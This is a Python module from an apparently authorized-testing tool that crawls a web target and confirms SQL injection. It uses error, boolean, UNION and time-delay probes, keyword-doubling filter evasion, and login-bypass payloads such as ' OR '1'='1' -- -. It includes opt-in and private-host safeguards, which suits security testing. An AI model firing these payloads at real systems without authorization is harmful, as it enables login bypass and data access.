"""Active SQL injection verification for explicitly authorized targets.

This module sends real SQL payloads at a target supplied by the operator. It is
deliberately opt-in: the CLI requires ``--i-own-this-target``, and targets must
resolve to a loopback, private or lab-style host unless ``--allow-public`` is
given. Every probe is read-only: boolean, error, UNION and time-delay only.
No statement in this module can modify or destroy data.

When no parameter is supplied, the verifier discovers GET forms, query-string
links and login forms from the page itself, so ``sentinel <url>
--i-own-this-target`` is enough. ``--crawl`` extends discovery across
same-origin pages.
"""

from __future__ import annotations

import html
import ipaddress
import re
import time
from dataclasses import dataclass, field, replace
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import httpx

from src.active.discover import DiscoveredTarget, crawl_links, discover_page_targets

USER_AGENT: str = "SentinelActive/0.1 (authorized-injection-verification)"
MARKER: str = "SentinelMark7f3a"
DEFAULT_BUDGET: int = 120
DEFAULT_DELAY: float = 0.15
DEFAULT_TIMEOUT: float = 10.0
TIME_THRESHOLD: float = 1.8
CONTROL_THRESHOLD: float = 1.0
MAX_UNION_COLUMNS: int = 6
MARKER_LETTERS: str = "ABCDEF"

SQL_ERROR_SIGNATURES: tuple[str, ...] = (
    "sqlite3.operationalerror",
    "sqlite error",
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error at or near",
    "pg::syntaxerror",
    "psycopg2.errors",
    "sqlalchemy.exc.operationalerror",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "ora-00933",
    "ora-01756",
    "sqlstate[",
    'near "',
)

SUCCESS_MARKERS: tuple[str, ...] = (
    "authenticated",
    "signed in",
    "logged in",
    "welcome back",
    "dashboard",
    "logout",
)

FLAG_PATTERN: re.Pattern[str] = re.compile(r"flag\{[^}]{1,200}\}", re.IGNORECASE)

INJECTION_CONTEXTS: tuple[tuple[str, str], ...] = (
    ("'", "-- -"),
    ('"', "-- -"),
    ("')", "-- -"),
    ('")', "-- -"),
    ("", "-- -"),
)

BOOLEAN_PAIRS: tuple[tuple[str, str], ...] = (
    ("{prefix} AND 1=1{comment}", "{prefix} AND 1=2{comment}"),
    ("{prefix} OR 1=1{comment}", "{prefix} OR 1=2{comment}"),
    ("{prefix} aANDnd 1=1{comment}", "{prefix} aANDnd 1=2{comment}"),
    ("{prefix} oORr 1=1{comment}", "{prefix} oORr 1=2{comment}"),
)

LOGIN_PAYLOADS: tuple[str, ...] = (
    "' OR '1'='1' -- -",
    "' OR 1=1 -- -",
    "' OR '1'='1'#",
    "admin' -- -",
    "') OR ('1'='1' -- -",
    '" OR "1"="1" -- -',
)

TIME_PAYLOADS: tuple[tuple[str, str, float], ...] = (
    ("mysql-sleep", "' AND SLEEP({seconds})-- -", 2.0),
    ("postgres-sleep", "';SELECT pg_sleep({seconds})-- -", 2.0),
    ("mssql-waitfor", "';WAITFOR DELAY '0:0:{seconds}'-- -", 2.0),
    ("sqlite-heavy", "' AND length(randomblob(50000000))>0-- -", 0.0),
)

_TAG_RE: re.Pattern[str] = re.compile(r"(?is)<(script|style)\b.*?</\1>")
_BLOCK_RE: re.Pattern[str] = re.compile(r"(?is)<[^>]+>")
_MARKER_CELL_RE: re.Pattern[str] = re.compile(
    rf"(?is)<(?:td|th|li|dd)\b[^>]*>[^<]*({re.escape(MARKER)}[A-F])"
)
_CONDITION_RE: re.Pattern[str] = re.compile(r"(?i)\b1\s*=\s*[12]\b")

PROBE_ALPHABET: str = "abcdefghijklmnopqrstuvwxyz0123456789"


@dataclass(frozen=True)
class SqlFinding:
    """A confirmed injection technique against one parameter."""

    technique: str
    parameter: str
    payload: str
    confidence: str
    evidence: str
    target: str = ""


@dataclass
class ActiveReport:
    """Result of one active verification run."""

    target: str
    mode: str
    requests: int = 0
    pages: int = 0
    findings: list[SqlFinding] = field(default_factory=list)
    tested: list[str] = field(default_factory=list)
    skipped: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)
    elapsed: float = 0.0

    def _confirmed(self) -> bool:
        return bool(self.findings)

    def _vulnerable_targets(self) -> list[str]:
        return sorted({finding.target for finding in self.findings if finding.target})


class _BudgetExceeded(RuntimeError):
    """Raised when the configured request budget is exhausted."""


class _ProbeFailure(RuntimeError):
    """Raised when a probe request fails at the transport level."""


class _ProbeSession:
    """HTTP session that enforces a request budget and an inter-request delay."""

    def __init__(
        self,
        budget: int = DEFAULT_BUDGET,
        delay: float = DEFAULT_DELAY,
        timeout: float = DEFAULT_TIMEOUT,
    ) -> None:
        self.budget = max(1, budget)
        self.delay = max(0.0, delay)
        self.requests = 0
        self._client = httpx.Client(
            timeout=timeout,
            follow_redirects=True,
            headers={"User-Agent": USER_AGENT},
        )

    def fetch(
        self,
        method: str,
        url: str,
        *,
        params: dict[str, str] | None = None,
        data: dict[str, str] | None = None,
    ) -> httpx.Response:
        """Send one request, respecting the delay and the budget."""
        if self.requests >= self.budget:
            raise _BudgetExceeded(f"request budget of {self.budget} exhausted")
        if self.delay:
            time.sleep(self.delay)
        self.requests += 1
        try:
            return self._client.request(method.upper(), url, params=params, data=data)
        except httpx.HTTPError as exc:
            raise _ProbeFailure(f"{type(exc).__name__}: {exc}") from exc

    def close(self) -> None:
        self._client.close()


def _token(length: int = 10) -> str:
    """Return a deterministic-looking random token without importing secrets."""
    seed = int(time.time_ns() % 1_000_000_007)
    out = []
    for _ in range(length):
        seed = (seed * 1103515245 + 12345) & 0x7FFFFFFF
        out.append(PROBE_ALPHABET[seed % len(PROBE_ALPHABET)])
    return "".join(out)


def _page_text(body: str) -> str:
    """Return visible page text with markup, scripts and styles removed."""
    without_scripts = _TAG_RE.sub(" ", body)
    without_tags = _BLOCK_RE.sub("\n", without_scripts)
    return re.sub(r"[ \t]+", " ", without_tags)


def _lines(body: str) -> list[str]:
    """Return deduplicated non-empty visible lines in document order."""
    seen: set[str] = set()
    ordered: list[str] = []
    for raw in _page_text(body).splitlines():
        line = raw.strip()
        if line and line not in seen:
            seen.add(line)
            ordered.append(line)
    return ordered


def _added_lines(baseline: str, probe: str) -> list[str]:
    """Return visible lines present in the probe page but absent from baseline."""
    base = set(_lines(baseline))
    return [line for line in _lines(probe) if line not in base]


def _row_count(body: str) -> int:
    """Count rendered table rows, a stable proxy for result-set size."""
    return len(re.findall(r"(?i)<tr\b", body))


def _signal_lines(body: str, *echoes: str) -> set[str]:
    """Return visible lines that carry query results rather than query echoes.

    Lab pages echo the submitted payload and the sanitized statement back to the
    page. Those lines always differ between a true and a false probe, so they
    are filtered out before comparing two responses.
    """
    needles = set()
    for echo in echoes:
        if not echo:
            continue
        needles.add(echo.casefold())
        needles.add(html.unescape(echo).casefold())
    signals: set[str] = set()
    for line in _lines(body):
        folded = html.unescape(line).casefold()
        if any(needle in folded for needle in needles):
            continue
        if _CONDITION_RE.search(folded):
            continue
        signals.add(folded)
    return signals


def _marker_rendered(body: str) -> str | None:
    """Return the marker rendered inside a result cell, if any.

    Payloads are echoed back by many lab pages (query logs, executed-statement
    panels), so a bare substring search produces false positives. Only a marker
    inside a table cell, list item or JSON scalar counts as a result row.
    """
    match = _MARKER_CELL_RE.search(body)
    if match:
        return match.group(1)
    stripped = body.strip()
    if stripped.startswith(("{", "[")):
        for letter in MARKER_LETTERS:
            candidate = f"{MARKER}{letter}"
            if f'"{candidate}"' in stripped:
                return candidate
    return None


def _sql_errors(body: str) -> list[str]:
    """Return the database error signatures visible in a response."""
    lowered = body.lower()
    return [signature for signature in SQL_ERROR_SIGNATURES if signature in lowered]


def _with_param(url: str, name: str, value: str) -> str:
    """Return ``url`` with ``name`` set to ``value``, preserving other params."""
    parsed = urlparse(url)
    pairs = [
        (key, val) for key, val in parse_qsl(parsed.query, keep_blank_values=True) if key != name
    ]
    pairs.append((name, value))
    return urlunparse(parsed._replace(query=urlencode(pairs)))


def _send_probe(
    session: _ProbeSession,
    method: str,
    url: str,
    param: str,
    value: str,
) -> httpx.Response:
    """Send one probe, placing the value in the body for POST targets."""
    if method.upper() == "POST":
        return session.fetch("POST", url, data={param: value})
    return session.fetch(method, _with_param(url, param, value))


def _is_authorized_target(url: str, allow_public: bool) -> bool:
    """Return True when the target is a loopback, private or lab-style host."""
    host = (urlparse(url).hostname or "").lower()
    if not host:
        return False
    if allow_public:
        return True
    if host in {"localhost", "localhost.localdomain"} or host.endswith(
        (".local", ".lan", ".lab", ".internal", ".home")
    ):
        return True
    try:
        address = ipaddress.ip_address(host)
    except ValueError:
        return False
    return address.is_loopback or address.is_private or address.is_link_local


def _log_error(report: ActiveReport, response: httpx.Response) -> None:
    """Record a non-success status once per probe family."""
    if response.status_code >= 500:
        note = f"server returned HTTP {response.status_code} for one probe"
        if note not in report.notes:
            report.notes.append(note)


def _probe_errors(
    session: _ProbeSession,
    report: ActiveReport,
    url: str,
    method: str,
    param: str,
) -> list[SqlFinding]:
    """Send syntax-breaking quotes and look for database error disclosure."""
    findings: list[SqlFinding] = []
    baseline = _send_probe(session, method, url, param, f"sentinel{_token(6)}")
    for prefix, _comment in INJECTION_CONTEXTS:
        payload = prefix if prefix else "sentinel'"
        response = _send_probe(session, method, url, param, payload)
        _log_error(report, response)
        hits = _sql_errors(response.text)
        if hits and (not _sql_errors(baseline.text) or hits != _sql_errors(baseline.text)):
            findings.append(
                SqlFinding(
                    technique="error-based",
                    parameter=param,
                    payload=payload,
                    confidence="HIGH",
                    evidence=f"database error disclosed: {', '.join(hits)}",
                )
            )
            break
    return findings


def _probe_boolean(
    session: _ProbeSession,
    report: ActiveReport,
    url: str,
    method: str,
    param: str,
) -> list[SqlFinding]:
    """Compare true and false predicates, including filter-evasion variants."""
    benign = f"sentinel{_token(6)}"
    baseline = _send_probe(session, method, url, param, benign)
    _log_error(report, baseline)
    base_rows = _row_count(baseline.text)

    for prefix, comment in INJECTION_CONTEXTS:
        for true_template, false_template in BOOLEAN_PAIRS:
            true_payload = true_template.format(prefix=prefix, comment=comment)
            false_payload = false_template.format(prefix=prefix, comment=comment)
            true_first = _send_probe(session, method, url, param, true_payload)
            false_first = _send_probe(session, method, url, param, false_payload)
            _log_error(report, true_first)
            _log_error(report, false_first)

            true_rows = _row_count(true_first.text)
            false_rows = _row_count(false_first.text)
            true_signals = _signal_lines(true_first.text, true_payload)
            false_signals = _signal_lines(false_first.text, false_payload)
            if true_rows == false_rows and true_signals == false_signals:
                continue

            true_second = _send_probe(session, method, url, param, true_payload)
            false_second = _send_probe(session, method, url, param, false_payload)
            _log_error(report, true_second)
            _log_error(report, false_second)
            if _row_count(true_second.text) != true_rows:
                continue
            if _row_count(false_second.text) != false_rows:
                continue
            if _signal_lines(true_second.text, true_payload) != true_signals:
                continue
            if _signal_lines(false_second.text, false_payload) != false_signals:
                continue

            if true_rows != false_rows:
                evidence = (
                    f"row count true={true_rows} false={false_rows} "
                    f"(baseline={base_rows}), stable across repeats"
                )
            else:
                evidence = (
                    f"{len(true_signals ^ false_signals)} result line(s) differ between "
                    "true and false predicates, stable across repeats"
                )
            if "aANDnd" in true_payload or "oORr" in true_payload:
                evidence += "; single-pass keyword filter bypassed by doubling"
            return [
                SqlFinding(
                    technique="boolean-based",
                    parameter=param,
                    payload=true_payload,
                    confidence="HIGH",
                    evidence=evidence,
                )
            ]
    return []


def _double_keyword(keyword: str) -> str:
    """Nest a keyword inside itself so a single-pass strip leaves it intact."""
    split = max(1, len(keyword) // 2)
    return f"{keyword[:split]}{keyword}{keyword[split:]}"


def _probe_union(
    session: _ProbeSession,
    report: ActiveReport,
    url: str,
    method: str,
    param: str,
) -> list[SqlFinding]:
    """Probe for a UNION projection that renders a marker in the response."""
    union_evasion = _double_keyword("UNION")
    select_evasion = _double_keyword("SELECT")
    for prefix, comment in INJECTION_CONTEXTS[:2]:
        for columns in range(1, MAX_UNION_COLUMNS + 1):
            values = [f"'{MARKER}{letter}'" for letter in MARKER_LETTERS[:columns]]
            projection = ",".join(values)
            plain = f"{prefix} UNION SELECT {projection}{comment}"
            evaded = f"{prefix} {union_evasion} {select_evasion} {projection}{comment}"
            for payload in (plain, evaded):
                response = _send_probe(session, method, url, param, payload)
                _log_error(report, response)
                rendered = _marker_rendered(response.text)
                if rendered is None:
                    continue
                position = MARKER_LETTERS.index(rendered[-1]) + 1
                evidence = (
                    f"marker '{rendered}' rendered with {columns} projected "
                    f"column(s), position {position}"
                )
                if payload == evaded:
                    evidence += "; single-pass keyword filter bypassed by doubling"
                return [
                    SqlFinding(
                        technique="union-based",
                        parameter=param,
                        payload=payload,
                        confidence="HIGH",
                        evidence=evidence,
                    )
                ]
    return []


def _probe_time(
    session: _ProbeSession,
    report: ActiveReport,
    url: str,
    method: str,
    param: str,
) -> list[SqlFinding]:
    """Measure response delay against a fast control request."""
    control_started = time.perf_counter()
    control = _send_probe(session, method, url, param, f"sentinel{_token(6)}")
    control_elapsed = time.perf_counter() - control_started
    _log_error(report, control)

    for name, template, seconds in TIME_PAYLOADS:
        payload = template.format(seconds=int(seconds))
        started = time.perf_counter()
        response = _send_probe(session, method, url, param, payload)
        elapsed = time.perf_counter() - started
        _log_error(report, response)
        if elapsed >= TIME_THRESHOLD and control_elapsed < CONTROL_THRESHOLD:
            return [
                SqlFinding(
                    technique=f"time-based ({name})",
                    parameter=param,
                    payload=payload,
                    confidence="MEDIUM",
                    evidence=(f"delay {elapsed:.2f}s versus control {control_elapsed:.2f}s"),
                )
            ]
    return []


def _verify_parameter(
    session: _ProbeSession,
    report: ActiveReport,
    url: str,
    method: str,
    param: str,
    *,
    target: str = "",
    time_probes: bool = True,
) -> None:
    """Run every injection family against one parameter."""
    probes = [_probe_errors, _probe_boolean, _probe_union]
    if time_probes:
        probes.append(_probe_time)
    for probe in probes:
        try:
            found = probe(session, report, url, method, param)
            report.findings.extend(
                replace(finding, target=target) if not finding.target else finding
                for finding in found
            )
        except _BudgetExceeded:
            raise
        except _ProbeFailure as exc:
            report.errors.append(f"{probe.__name__} on '{param}': {exc}")
            continue


def _success_markers(added: list[str]) -> list[str]:
    """Return authentication success markers found in newly rendered lines."""
    joined = " ".join(added).lower()
    return [marker for marker in SUCCESS_MARKERS if marker in joined]


def _verify_login(
    session: _ProbeSession,
    report: ActiveReport,
    url: str,
    user_field: str,
    pass_field: str,
    extra_fields: dict[str, str],
    *,
    target: str = "",
) -> None:
    """Attempt authentication bypass payloads and detect a successful session."""
    baseline = session.fetch(
        "POST",
        url,
        data={user_field: f"nobody{_token(6)}", pass_field: f"bad{_token(6)}", **extra_fields},
    )
    _log_error(report, baseline)
    repeat = session.fetch(
        "POST",
        url,
        data={user_field: f"nobody{_token(6)}", pass_field: f"bad{_token(6)}", **extra_fields},
    )
    if _page_text(baseline.text) != _page_text(repeat.text):
        report.notes.append("login page is not stable between identical requests")

    for payload in LOGIN_PAYLOADS:
        response = session.fetch(
            "POST",
            url,
            data={user_field: payload, pass_field: "x", **extra_fields},
        )
        _log_error(report, response)
        added = _added_lines(baseline.text, response.text)
        markers = _success_markers(added)
        flags = FLAG_PATTERN.findall(" ".join(added))
        if not markers and not flags:
            continue
        evidence_parts = []
        if markers:
            evidence_parts.append(f"new success markers: {', '.join(markers)}")
        if flags:
            evidence_parts.append(f"captured {flags[0]}")
        report.findings.append(
            SqlFinding(
                technique="auth-bypass",
                parameter=f"{user_field} (POST)",
                payload=payload,
                confidence="HIGH" if flags else "MEDIUM",
                evidence="; ".join(evidence_parts),
                target=target,
            )
        )
        return


def _display_target(url: str) -> str:
    """Return a short display form of a URL."""
    parsed = urlparse(url)
    path = parsed.path or "/"
    if parsed.query:
        return f"{path}?{parsed.query}"
    return path


def _collect_targets(
    session: _ProbeSession,
    start_url: str,
    *,
    crawl: bool,
    max_pages: int,
) -> tuple[list[DiscoveredTarget], list[str], int, list[str]]:
    """Discover injectable targets, optionally crawling same-origin pages."""
    queue: list[str] = [start_url]
    visited: set[str] = {start_url}
    targets: list[DiscoveredTarget] = []
    seen: set[tuple[str, str, tuple[str, ...], bool]] = set()
    errors: list[str] = []
    skipped: list[str] = []
    pages = 0

    while queue and len(visited) <= max_pages:
        page_url = queue.pop(0)
        try:
            response = session.fetch("GET", page_url)
        except _ProbeFailure as exc:
            errors.append(f"{_display_target(page_url)}: {exc}")
            continue
        pages += 1
        if response.status_code >= 500:
            errors.append(f"{_display_target(page_url)}: HTTP {response.status_code}")
            continue
        discovered = discover_page_targets(page_url, response.text)
        page_bare = page_url.split("?")[0]
        linked_target = any(target.url.split("?")[0] == page_bare for target in targets)
        if not discovered and page_url != start_url and not linked_target:
            skipped.append(_display_target(page_url))
        for target in discovered:
            key = (target.url, target.method, target.params, target.login)
            if key in seen:
                continue
            seen.add(key)
            targets.append(target)
        if not crawl:
            break
        for link in crawl_links(page_url, response.text):
            if link in visited:
                continue
            visited.add(link)
            queue.append(link)
            if len(visited) >= max_pages:
                break

    return targets, errors, pages, skipped


def _execute(
    session: _ProbeSession,
    report: ActiveReport,
    targets: list[DiscoveredTarget],
    *,
    time_probes: bool,
) -> None:
    """Run probes for every target, sharing one session and budget."""
    report.tested = list(dict.fromkeys(target.label for target in targets))
    for target in targets:
        try:
            if target.login:
                _verify_login(
                    session,
                    report,
                    target.url,
                    target.user_field,
                    target.pass_field,
                    {},
                    target=target.label,
                )
            else:
                for param in target.params:
                    _verify_parameter(
                        session,
                        report,
                        target.url,
                        target.method,
                        param,
                        target=target.label,
                        time_probes=time_probes,
                    )
        except _BudgetExceeded as exc:
            report.errors.append(str(exc))
            break
        except _ProbeFailure as exc:
            report.errors.append(f"{target.label}: {exc}")
            continue


def _run(
    targets: list[DiscoveredTarget],
    *,
    budget: int,
    delay: float,
    timeout: float,
    time_probes: bool = True,
    mode: str | None = None,
    display: str | None = None,
) -> ActiveReport:
    """Execute probes across prepared targets and return one report."""
    if not targets:
        raise ValueError("no injectable targets to verify")
    report = ActiveReport(
        target=display or targets[0].url,
        mode=mode or targets[0].label,
    )
    session = _ProbeSession(budget=budget, delay=delay, timeout=timeout)
    started = time.perf_counter()
    try:
        _execute(session, report, targets, time_probes=time_probes)
    finally:
        report.pages = 1
        report.requests = session.requests
        report.elapsed = time.perf_counter() - started
        session.close()
    return report


def _run_discovered(
    url: str,
    *,
    crawl: bool,
    budget: int,
    delay: float,
    timeout: float,
    time_probes: bool,
    max_pages: int,
) -> ActiveReport:
    """Discover targets on ``url`` and verify them in one run."""
    report = ActiveReport(
        target=_display_target(url),
        mode="site crawl" if crawl else "auto-discovery",
    )
    session = _ProbeSession(budget=budget, delay=delay, timeout=timeout)
    started = time.perf_counter()
    try:
        targets, errors, pages, skipped = _collect_targets(
            session,
            url,
            crawl=crawl,
            max_pages=max_pages,
        )
        report.pages = pages
        report.skipped = skipped
        report.errors.extend(errors)
        if targets:
            _execute(session, report, targets, time_probes=time_probes)
        else:
            report.notes.append("no injectable parameters discovered")
    finally:
        report.requests = session.requests
        report.elapsed = time.perf_counter() - started
        session.close()
    return report


def _detail(finding: SqlFinding) -> str:
    """Return one compact line describing the evidence."""
    evidence = finding.evidence
    if finding.technique == "boolean-based":
        match = re.search(r"row count true=(\d+) false=(\d+)", evidence)
        if match:
            return f"rows {match.group(1)} vs {match.group(2)}"
        match = re.search(r"(\d+) result line", evidence)
        if match:
            return f"{match.group(1)} lines differ"
    if finding.technique == "union-based":
        match = re.search(r"with (\d+) projected", evidence)
        if match:
            return f"{match.group(1)} columns"
    if finding.technique.startswith("time-based"):
        match = re.search(r"delay ([\d.]+s)", evidence)
        if match:
            return f"delay {match.group(1)}"
    if finding.technique == "auth-bypass":
        if "captured " in evidence:
            return "flag captured"
        return "login bypassed"
    if finding.technique == "error-based":
        return "database error"
    return evidence[:48]


def _render_text(report: ActiveReport, *, verbose: bool = False) -> str:
    """Render a compact verification summary."""
    pages = report.pages or 1
    header = (
        f"Active SQLi  {report.target}  "
        f"({pages} page{'s' if pages != 1 else ''}, {len(report.tested)} endpoints, "
        f"{report.requests} requests, {report.elapsed:.1f}s)"
    )
    lines = [header, ""]

    if report.findings:
        rows = [
            f"CONFIRMED  {finding.target or report.target:<24}  "
            f"{finding.parameter:<12}  {finding.technique:<16}  {_detail(finding)}"
            for finding in report.findings
        ]
        lines.extend(rows)
        if verbose:
            lines.append("")
            for finding in report.findings:
                lines.append(f"  payload: {finding.payload}")
                lines.append(f"  evidence: {finding.evidence}")
    else:
        lines.append("No injection technique could be confirmed.")

    clean = [label for label in report.tested if label not in set(report._vulnerable_targets())]
    if clean:
        shown = ", ".join(clean[:12])
        extra = f" (+{len(clean) - 12} more)" if len(clean) > 12 else ""
        lines.append("")
        lines.append(f"clean: {shown}{extra}")

    if report.skipped:
        shown = ", ".join(report.skipped[:20])
        extra = f" (+{len(report.skipped) - 20} more)" if len(report.skipped) > 20 else ""
        lines.append("no params: " + shown + extra)

    summary = (
        f"{len(report._vulnerable_targets())} of {len(report.tested)} endpoints vulnerable"
        if report.tested
        else "nothing tested"
    )
    if report.findings:
        summary += f" · {len(report.findings)} confirmed"
    lines.append(f"summary: {summary}")

    if verbose:
        for note in report.notes:
            lines.append(f"note: {note}")
    for error in report.errors[:5]:
        lines.append(f"error: {error}")
    if len(report.errors) > 5:
        lines.append(f"error: +{len(report.errors) - 5} more")
    return "\n".join(lines)


def _to_dict(report: ActiveReport) -> dict[str, object]:
    """Return the report as a JSON-serializable mapping."""
    return {
        "schema_version": "1.0.0",
        "report_type": "active-sqli",
        "target": report.target,
        "mode": report.mode,
        "requests": report.requests,
        "pages": report.pages,
        "elapsed_seconds": round(report.elapsed, 3),
        "confirmed": report._confirmed(),
        "targets": report.tested,
        "no_parameters": report.skipped,
        "vulnerable_targets": report._vulnerable_targets(),
        "findings": [
            {
                "target": finding.target,
                "technique": finding.technique,
                "parameter": finding.parameter,
                "payload": finding.payload,
                "confidence": finding.confidence,
                "evidence": finding.evidence,
            }
            for finding in report.findings
        ],
        "notes": report.notes,
        "errors": report.errors,
    }
